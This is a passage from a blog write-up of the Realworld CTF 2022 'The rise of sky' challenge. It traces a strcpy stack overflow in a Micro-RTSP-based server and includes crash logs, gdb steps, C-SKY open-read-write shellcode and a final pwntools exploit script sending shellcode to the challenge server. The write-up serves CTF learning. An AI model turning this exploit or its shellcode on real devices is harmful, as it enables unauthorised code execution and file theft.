<p>Hmm nothing interesting, it should listen on some port, let&#8217;s run server in background and check netstat.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-bash" data-lang="Bash"><code># ./server ./demo.mjpeg 800 450 &
# running RTSP server

# netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       
tcp        0      0 0.0.0.0:8554            0.0.0.0:*               LISTEN      
netstat: /proc/net/tcp6: No such file or directory
netstat: /proc/net/udp6: No such file or directory
netstat: /proc/net/raw6: No such file or directory
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node Path
netstat: /proc/net/unix: bogus data on line 2
netstat: /proc/net/unix: bogus data on line 3</code></pre></div>



<p>See that 8554? That&#8217;s our sweet port.</p>



<p>But how exactly can we connect to this port? What protocol can we use?</p>



<h2 id="0x4-darkness-of-rtsp">0x4 Darkness of RTSP</h2>



<p>After no luck in reversing and port connection, I decided to turn my eyes on actual target server hosted by RWCTF.</p>



<p>Since I cannot reproduce this part because CTF server is closed, I&#8217;ll just let you know that platform server port will return a rtsp url after inputting your team token, and we can actually view it with VLC :).</p>



<figure class="wp-block-image size-full"><img loading="lazy" width="802" height="565" src="https://pwnblog.github.io/wp-content/uploads/2022/02/image-1.png" alt="" class="wp-image-61" srcset="https://pwnblog.github.io/wp-content/uploads/2022/02/image-1.png 802w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-1-300x211.png 300w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-1-768x541.png 768w" sizes="(max-width: 802px) 100vw, 802px" /></figure>



<p>Nothing interesting here, but we can reuse this url to make similar requests to our testing server.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>vlc -v rtsp://192.168.101.23:8554/mjpeg/1</code></pre></div>



<p>And you should see something like this in qemu:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code># ./server ./demo.mjpeg 800 450 &
# running RTSP server

# Client connected. Client address: 192.168.101.200
Creating TSP streamer
file streamer constructor
Creating RTSP session
RTSP received OPTIONS
RTSP received DESCRIBE
RTSP received SETUP
RTSP received PLAY
file streamer streamImage
....</code></pre></div>



<p>So now what? </p>



<p>In this type of CTF, I highly doubt they write a fresh rtsp server from scratch, so I searched some strings in Github and eventually I found <a rel="noreferrer noopener" href="https://github.com/geeksville/Micro-RTSP" target="_blank">this repo.</a></p>



<p>And this file <a href="https://github.com/geeksville/Micro-RTSP/blob/master/src/CRtspSession.cpp#L65" target="_blank" rel="noreferrer noopener">https://github.com/geeksville/Micro-RTSP/blob/master/src/CRtspSession.cpp#L65</a>.</p>



<p>I can confirm this challenge borrow some code from this repo with 99% confidence, look at how similar the strings are, guys.</p>



<p>That BIG strcpy is super interesting at first glance, and indeed this is a stack overflow bug!</p>



<p>Let&#8217;s test this bug in our testing server and see if it exists!</p>



<h2 id="0x5-overflow-the-sky">0x5 Overflow the sky</h2>



<p>We must have string &#8220;client_port&#8221; in our packet of course, but that&#8217;s not enough.</p>



<p>In line 402 of source code:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>    int res = socketread(m_RtspClient,RecvBuf,sizeof(RecvBuf), readTimeoutMs);
    if(res &gt; 0) {
        // we filter away everything which seems not to be an RTSP command: O-ption, D-escribe, S-etup, P-lay, T-eardown
        if ((RecvBuf[0] == &#39;O&#39;) || (RecvBuf[0] == &#39;D&#39;) || (RecvBuf[0] == &#39;S&#39;) || (RecvBuf[0] == &#39;P&#39;) || (RecvBuf[0] == &#39;T&#39;))
        {
            RTSP_CMD_TYPES C = Handle_RtspRequest(RecvBuf,res);
            if (C == RTSP_PLAY)
                m_streaming = true;
            else if (C == RTSP_TEARDOWN)
                m_stopped = true;
        }</code></pre></div>



<p>Here it checks if first byte of tcp packet is &#8220;O&#8221;,&#8221;D&#8221;,&#8221;S&#8221;,&#8221;P&#8221; or &#8220;T&#8221;, if check fails server won&#8217;t handle it as rtsp packet.</p>



<p>And the actual bug code:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>    char * ClientPortPtr;
    char * TmpPtr;
    static char CP[1024];
...
    ClientPortPtr = strstr(CurRequest,&quot;client_port&quot;);
    if (ClientPortPtr != nullptr)
    {
        TmpPtr = strstr(ClientPortPtr,&quot;\r\n&quot;);
        if (TmpPtr != nullptr)
        {
            TmpPtr[0] = 0x00;
            strcpy(CP,ClientPortPtr);
...</code></pre></div>



<p>Here it checks if request packet have string &#8220;client_port&#8221; or not, and simply copy <strong>ANYTHING </strong>after &#8220;client_port&#8221; till &#8220;\r\n&#8221; to variable CP, which resides in <strong>STACK</strong>.</p>



<p>Time to craft our testing script.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-python" data-lang="Python"><code>from pwn import *

debug = 1
context.log_level = &#39;debug&#39;

if debug:
    p = remote(&#39;192.168.101.23&#39;, 8554)
else:
    p = remote(&#39;47.242.246.203&#39;, 32042)

test = b&#39;Oclient_port&#39; + b&#39;a&#39; * 2000 + b&#39;\r\n&#39;

p.send(test)
# p.sendline(test)
p.interactive()</code></pre></div>



<p>And server crashed!</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>[ 3167.446179] server[124]: unhandled signal 11 code 0x1 at 0x61616000
[ 3167.449816] 
[ 3167.449816] CURRENT PROCESS:
[ 3167.449816] 
[ 3167.450191] COMM=server PID=124
[ 3167.450447] TEXT=00008000-00138090 DATA=0013976c-0013f4e8 BSS=0013f4e8-01b75000
[ 3167.450899] USER-STACK=7f860e60  KERNEL-STACK=817a7700
[ 3167.450899] 
[ 3167.451604] PC: 0x61616160 (0x61616160)
[ 3167.451872] LR: 0x61616161 (0x61616161)
[ 3167.452362] SP: 0x7f860800
[ 3167.452550] PSR: 0x00140341
[ 3167.452958] orig_a0: 0x00000000
[ 3167.453129] PT_REGS: 0x817eff68
[ 3167.453380]  a0: 0x00000000   a1: 0x00000000   a2: 0x00163568   a3: 0x00000000
[ 3167.453739]  r4: 0x61616161   r5: 0x00000320   r6: 0x00000000   r7: 0x00000000
[ 3167.454170]  r8: 0x61616161   r9: 0x0053e45c  r10: 0x000ec6fc  r11: 0x00000001
[ 3167.454613] r12: 0x00000001  r13: 0x00000001  r15: 0x61616161
[ 3167.455078] r16: 0x00000000  r17: 0x0053e558  r18: 0x00163568  r19: 0x00000000
[ 3167.455406] r20: 0x0013fceb  r21: 0x0000000a  r22: 0x00000001  r23: 0x00000001
[ 3167.456234] r24: 0x01b53478  r25: 0x00000054  r26: 0x77e159f0  r27: 0x00000000
[ 3167.456546] r28: 0x77ec1000  r29: 0x00000000  r30: 0x00000000  tls: 0x01b53478
[ 3167.457641]  hi: 0x00000000   lo: 0x00000000</code></pre></div>



<p>The pc register has been hijacked successfully! <strong>Stack overflow is real</strong>!</p>



<p>After some testing we can confirm we need exactly 1273 bytes of &#8220;a&#8221; to reach the final PC hijack point.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-python" data-lang="Python"><code>test = b&#39;Oclient_port&#39; + b&#39;a&#39; * 1273+p32(0x12345678) + b&#39;\r\n&#39;</code></pre></div>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>[ 3349.657774] server[125]: unhandled signal 11 code 0x1 at 0x12345000
[ 3349.661123] 
[ 3349.661123] CURRENT PROCESS:
[ 3349.661123] 
[ 3349.661832] COMM=server PID=125
[ 3349.662149] TEXT=00008000-00138090 DATA=0013976c-0013f4e8 BSS=0013f4e8-01b75000
[ 3349.662476] USER-STACK=7f860e60  KERNEL-STACK=817a8840
[ 3349.662476] 
[ 3349.663194] PC: 0x12345678 (0x12345678)
[ 3349.663965] LR: 0x12345678 (0x12345678)
[ 3349.664348] SP: 0x7f860800
[ 3349.664758] PSR: 0x00140341
[ 3349.664962] orig_a0: 0x00000000
[ 3349.665287] PT_REGS: 0x81d91f68
[ 3349.665508]  a0: 0x00000000   a1: 0x00000000   a2: 0x00163568   a3: 0x00000000
[ 3349.666069]  r4: 0x7f860f00   r5: 0x00000320   r6: 0x00000000   r7: 0x00000000
[ 3349.666593]  r8: 0x61616161   r9: 0x0053e45c  r10: 0x000ec6fc  r11: 0x00000001
[ 3349.667269] r12: 0x00000001  r13: 0x00000001  r15: 0x12345678
[ 3349.667749] r16: 0x00000000  r17: 0x0053e558  r18: 0x00163568  r19: 0x00000000
[ 3349.668210] r20: 0x0013fa18  r21: 0x0000000a  r22: 0x00000001  r23: 0x00000001
[ 3349.668644] r24: 0x01b53478  r25: 0x00000054  r26: 0x77e159f0  r27: 0x00000000
[ 3349.669210] r28: 0x77ec1000  r29: 0x00000000  r30: 0x00000000  tls: 0x01b53478
[ 3349.669679]  hi: 0x00000000   lo: 0x00000000</code></pre></div>



<p>Don&#8217;t do ROP too fast, let&#8217;s check target&#8217;s maps.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code># cat /proc/122/maps
00008000-00139000 r-xp 00000000 fe:00 10162      /server
00139000-00140000 rw-p 00130000 fe:00 10162      /server
00140000-00164000 rwxp 00000000 00:00 0 
01b53000-01b75000 rwxp 00000000 00:00 0          [heap]
77f4a000-77f4c000 r-xp 00000000 00:00 0          [vdso]
77f4c000-77f4d000 r--p 00000000 00:00 0 
7f840000-7f861000 rwxp 00000000 00:00 0          [stack]</code></pre></div>



<p><strong>Target has no NX/ASLR enabled!</strong></p>



<p>So we just need to jmp esp&#8230;..Oh wait.</p>



<h2 id="0x6-debugging-and-shellcoding">0x6 Debugging and shellcoding</h2>



<p>We haven&#8217;t use any gdb till now, we have 2 options to exploit this bug:</p>



<ul><li>Eliminate any \x00\r\n in shellcode, directly jump to stack.</li><li>Find something interesting in fixed address and jump</li></ul>



<p>I&#8217;ve considered first solution and not only it is very tedious, but also we don&#8217;t know if zerofree shellcode is possible.</p>



<p>So let&#8217;s check if we can find something interesting in gdb.</p>



<p>Create a gdb file first, because this gdb is very primitive, you need to add some juice.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>define hook-stop
info registers
x/24wx  $sp
x/5i  $pc
end
set follow-fork-mode child
target remote 192.168.101.23:2222</code></pre></div>



<p><em>Tips: if you encounter some error while running gdb, try add lib path to LD_LIBRARY_PATH</em></p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>export LD_LIBRARY_PATH=/your/path/csky-toolchain/host/lib</code></pre></div>



<p>And let&#8217;s connect our gdb to gdbserver, run this in guest:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>/gdbserver --attach 0.0.0.0:2222 &lt;your server pid&gt; &</code></pre></div>



<p>Run our primitive gdb in host:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>./csky-linux-gdb -x &lt;your gdb script file&gt;</code></pre></div>



<p>You&#8217;ll see something similar to this if you trigger overflow again.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>Thread 2.1 &quot;server&quot; received signal SIGSEGV, Segmentation fault.
r0             0x0	0
r1             0x0	0
r2             0x163568	1455464
r3             0x0	0
r4             0x7fd46f00	2144628480
r5             0x320	800
r6             0x0	0
r7             0x0	0
r8             0x61616161	1633771873
r9             0x53e45c	5497948
r10            0xec6fc	968444
r11            0x1	1
r12            0x1	1
r13            0x1	1
r14            0x7fd46800	0x7fd46800
r15            0x12345678	305419896
r16            0x0	0
r17            0x53e558	5498200
r18            0x163568	1455464
r19            0x0	0
r20            0x13fa18	1309208
r21            0xa	10
r22            0x1	1
r23            0x1	1
r24            0xbdb478	12432504
r25            0x54	84
r26            0x77e159f0	2011257328
r27            0x0	0
r28            0x77ec1000	2011959296
r29            0x0	0
r30            0x0	0
r31            0x0	0
pc             0x12345678	0x12345678
epc            &lt;unavailable&gt;
psr            0x140341	1311553
epsr           &lt;unavailable&gt;
0x7fd46800:	0x0000050b	0x001436e8	0x7fd46848	0x7fd46824
0x7fd46810:	0x0000a5ac	0x00000190	0x7fd46848	0x00000004
0x7fd46820:	0x0000050b	0x7fd46d34	0x000083c0	0x000001c2
0x7fd46830:	0x000001c2	0x00000320	0x7fd46f4f	0x00000004
0x7fd46840:	0x00bdb478	0x00000348	0x7fd40000	0xeb8b4567
0x7fd46850:	0x00000004	0xffffffff	0x00000000	0x00000000
=&gt; 0x12345678:	Error while running hook_stop:
Cannot access memory at address 0x12345678
0x12345678 in ?? ()</code></pre></div>



<p>Can you spot $r20 is interesting? It points to somewhere in data/bss segment, they have fixed address because no ASLR.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>(cskygdb) x/20bx 0x13fa18
0x13fa18:	0x12	0x00	0x0a	0x00	0x00	0x00	0x00	0x00
0x13fa20:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x13fa28:	0x00	0x00	0x00	0x00
(cskygdb)  x/20bx 0x13fa10
0x13fa10:	0x61	0x61	0x61	0x61	0x61	0x78	0x56	0x34
0x13fa18:	0x12	0x00	0x0a	0x00	0x00	0x00	0x00	0x00
0x13fa20:	0x00	0x00	0x00	0x00</code></pre></div>



<p>Our packet is stored in <strong>FIXED ADDRESS!</strong></p>



<p>So here the solution is very obvious, control pc&#8211;&gt;ret to fixed packet address &#8211;&gt; shellcode!</p>



<p>How to generate this weird arch shellcode? Fortunately we have a gcc built in our toolchain, so just static compile your code, dump assembly by readelf and craft your shellcode. <em>Talk is easy, you&#8217;ll find it very time-consuming and feel frustrated.</em></p>



<p>FYFI here&#8217;s the shellcode I used:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code># shellcode for open read write
subi              sp, sp, 12
st.w              r8, (sp, 0)
st.w              r15, (sp, 0x4)
st.w              r4, (sp, 0x8)
mov              r8, sp
subi              sp, sp, 276
subi              r3, r8, 20
movi              r2, 47
st.b              r2, (r3, 0)
subi              r3, r8, 20
movi              r2, 102
st.b              r2, (r3, 0x1)
subi              r3, r8, 20
movi              r2, 108
st.b              r2, (r3, 0x2)
subi              r3, r8, 20
movi              r2, 97
st.b              r2, (r3, 0x3)
subi              r3, r8, 20
movi              r2, 103
st.b              r2, (r3, 0x4)
subi              r3, r8, 20
movi              r2, 0
st.b              r2, (r3, 0x5)
subi              r4, r8, 4
subi              r3, r8, 20
movi              r0, 0
mov              r1, r3
subi              r0, 100
movi              r7, 56
trap              0

lsli              r0, r0, 0
st.w              r0, (r4, 0)
subi              r1, r8, 276
subi              r3, r8, 4
movi              r2, 256
ld.w              r0, (r3, 0)
movi              r7, 63
trap              0

lsli              r0, r0, 0
subi              r3, r8, 276
movi              r2, 4096
mov              r1, r3
movi              r0, 4
movi              r7, 64
trap              0</code></pre></div>



<p>Why use open-read-write? Because u cannot communicate if u popped a shell in forked process, unless you dup some socket to 0,1,2, I chose not to do that.</p>



<h2 id="0x7-final-exploit">0x7 Final exploit</h2>



<p>Here&#8217;s my final exploit:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-python" data-lang="Python"><code>from pwn import *

debug = 0
context.log_level = &#39;debug&#39;
# 0x000093fc 0x9270 0x9294
base = 0x13f510
if debug:
    p = remote(&#39;192.168.101.23&#39;, 8554)
else:
    p = remote(&#39;47.242.246.203&#39;, 32042)

sc = [
    0x23, 0x14, 0x0E, 0xDD, 0x00, 0x20, 0xEE, 0xDD, 0x01, 0x20, 0x82, 0xB8, 0x3B, 0x6E, 0x25, 0x16,
    0x68, 0xE4, 0x13, 0x10, 0x2F, 0x32, 0x40, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x66, 0x32, 0x41, 0xA3,
    0x68, 0xE4, 0x13, 0x10, 0x6C, 0x32, 0x42, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x61, 0x32, 0x43, 0xA3,
    0x68, 0xE4, 0x13, 0x10, 0x67, 0x32, 0x44, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x00, 0x32, 0x45, 0xA3,
    0x88, 0xE4, 0x03, 0x10, 0x68, 0xE4, 0x13, 0x10, 0x00, 0x30, 0x4F, 0x6C, 0x63, 0x28, 0x38, 0x37,
    0x00, 0xC0, 0x20, 0x20, 0x00, 0x40, 0x00, 0xB4, 0x28, 0xE4, 0x13, 0x11, 0x68, 0xE4, 0x03, 0x10,
    0x02, 0xEA, 0x00, 0x01, 0x00, 0x93, 0x3F, 0x37, 0x00, 0xC0, 0x20, 0x20, 0x00, 0x40, 0x68, 0xE4,
    0x13, 0x11, 0x02, 0xEA, 0x00, 0x10, 0x4F, 0x6C, 0x04, 0x30, 0x40, 0x37, 0x00, 0xC0, 0x20, 0x20,
    0x00, 0x6C, 0xA3, 0x6F, 0x82, 0x98, 0xEE, 0xD9, 0x01, 0x20, 0x0E, 0xD9, 0x00, 0x20, 0x03, 0x14,

    # useless shellcode just for stucking process, popping a sh lol.
    0x22, 0x14, 0x0E, 0xDD, 0x00, 0x20, 0xEE, 0xDD, 0x01, 0x20, 0x3B, 0x6E, 0x2A, 0x14, 0x68, 0xE4,
    0x0F, 0x10, 0x2F, 0x32, 0x40, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x41, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x69, 0x32, 0x42, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x6E, 0x32, 0x43, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x2F, 0x32, 0x44, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x45, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x75, 0x32, 0x46, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x73, 0x32, 0x47, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x79, 0x32, 0x48, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x49, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x6F, 0x32, 0x4A, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x78, 0x32, 0x4B, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x00, 0x32, 0x4C, 0xA3, 0x68, 0xE4, 0x17, 0x10, 0x73, 0x32, 0x40, 0xA3, 0x68, 0xE4,
    0x17, 0x10, 0x68, 0x32, 0x41, 0xA3, 0x68, 0xE4, 0x17, 0x10, 0x00, 0x32, 0x42, 0xA3, 0x68, 0xE4,
    0x23, 0x10, 0x48, 0xE4, 0x0F, 0x10, 0x40, 0xB3, 0x68, 0xE4, 0x23, 0x10, 0x48, 0xE4, 0x17, 0x10,
    0x41, 0xB3, 0x68, 0xE4, 0x23, 0x10, 0x00, 0x32, 0x42, 0xB3, 0x68, 0xE4, 0x27, 0x10, 0x00, 0x32,
    0x40, 0xB3, 0x48, 0xE4, 0x27, 0x10, 0x28, 0xE4, 0x23, 0x10, 0x68, 0xE4, 0x0F, 0x10, 0x0F, 0x6C,
    0xE0, 0xB8, 0xDD, 0x37, 0x00, 0xC0, 0x20, 0x20, 0x02, 0x14, 0x3C, 0x78
]

test = b&#39;Oclient_port&#39; + b&#39;a&#39; * 1273 + p32(0x13fa1c)[:3] + b&#39;\r\nbb&#39; + bytearray(sc) + b&#39;\r\n&#39;

p.send(test)
p.interactive()</code></pre></div>



<p>What a long post, thank you!</p>



<p></p>
<p>The post <a rel="nofollow" href="https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/">Realworld CTF 2022 &#8220;The rise of sky&#8221; writeup</a> appeared first on <a rel="nofollow" href="https://pwnblog.github.io">Hopeless blog</a>.</p>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
